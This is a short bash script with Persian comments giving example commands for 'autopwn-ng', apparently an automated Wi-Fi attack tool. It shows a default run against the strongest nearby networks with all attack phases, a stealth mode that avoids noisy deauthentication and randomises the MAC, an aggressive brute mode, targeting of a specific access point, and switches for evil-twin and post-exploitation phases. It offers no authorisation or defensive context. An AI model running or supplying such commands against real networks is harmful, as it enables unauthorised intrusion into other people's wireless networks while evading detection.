#!/usr/bin/env bash

# اجرای پیش‌فرض روی قوی‌ترین شبکه‌ها، با همه فازها
sudo autopwn-ng -i wlan1 -I wlan2

# حالت مخفی: برداشت طولانی، بدون دِاوث پر سر و صدا، MAC رندوم
sudo autopwn-ng -i wlan1 -p stealth

# حالت تهاجمی: برداشت طولانی‌تر، workload بالا
sudo autopwn-ng -i wlan1 -I wlan2 -p brute

# هدف مشخص
sudo autopwn-ng -i wlan1 --target AA:BB:CC:DD:EE:FF

# بدون فازهای بلند
sudo autopwn-ng --no-twin --no-post -t 90
